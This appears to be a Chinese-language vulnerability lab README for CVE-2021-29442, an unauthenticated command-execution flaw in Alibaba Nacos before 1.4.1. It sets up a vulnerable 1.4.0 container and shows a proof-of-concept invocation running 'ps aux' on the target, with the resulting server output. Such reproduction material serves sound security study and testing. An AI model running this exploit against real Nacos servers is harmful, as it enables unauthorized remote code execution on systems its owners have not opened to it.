# Alibaba Nacos 未授权接口命令执行漏洞（CVE-2021-29442）

Nacos 是一个设计用于动态服务发现、配置和服务管理的易于使用的平台。

在Nacos 1.4.1之前的版本中，一些API端点（如`/nacos/v1/cs/ops/derby`）可以默认没有鉴权，可以被未经身份验证的用户公开访问。攻击者可以利用该漏洞执行任意Derby SQL语句和 Java 代码。

参考资料：

- <https://github.com/advisories/GHSA-xv5h-v7jh-p2qh>
- <https://github.com/alibaba/nacos/issues/4463>
- <https://github.com/ayoundzw/nacos-poc>
- <http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce>

## 漏洞环境

执行如下命令启动一个 Alibaba Nacos 1.4.0服务器：

```
docker compose up -d  
```

服务器启动后，访问`http://your-ip:8848/nacos/`可以看到 Nacos 的默认登录页面。

## 漏洞复现

执行[POC](poc.py)，`-t`参数指定目标地址，`-c`参数指定要执行的命令：

```
python poc.py -t http://your-ip:8848 -c "ps aux"  
```

`ps aux`命令成功执行后会收到如下响应：

```json
{"code":200,"message":null,"data":""}
{"code":200,"message":null,"data":[{"B":0,"A":"USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot           1  0.0  0.0 814608  4992 ?        Ss   18:47   0:00 [rosetta] /bin/bash /bin/bash bin/docker-startup.shroot          31 25.5  7.5 10414040 1534908 ?    Sl   18:47   1:14 [rosetta] /usr/lib/jvm/java-1.8.0-openjdk/bin/java /usr/lib/jvm/java-1.8.0-openjdk/bin/java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9555 -Xms2g -Xmx2g -Xmn1g -Dnacos.standalone=true -Dnacos.core.auth.enabled=true -Dnacos.member.list= -Djava.ext.dirs=/usr/lib/jvm/java-1.8.0-openjdk/jre/lib/ext:/usr/lib/jvm/java-1.8.0-openjdk/lib/ext:/home/nacos/plugins/health:/home/nacos/plugins/cmdb:/home/nacos/plugins/mysql -Xloggc:/home/nacos/logs/nacos_gc.log -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=100M -Dnacos.home=/home/nacos -jar /home/nacos/target/nacos-server.jar --spring.config.location=/home/nacos/init.d/,file:/home/nacos/conf/,classpath:/,classpath:/config/,file:./,file:./config/ --spring.config.name=application,custom --logging.config=/home/nacos/conf/nacos-logback.xml --server.max-http-header-size=524288root         406  0.0  0.0 854552  5504 ?        R    18:51   0:00 ps aux"}]}
```

![](1.png)
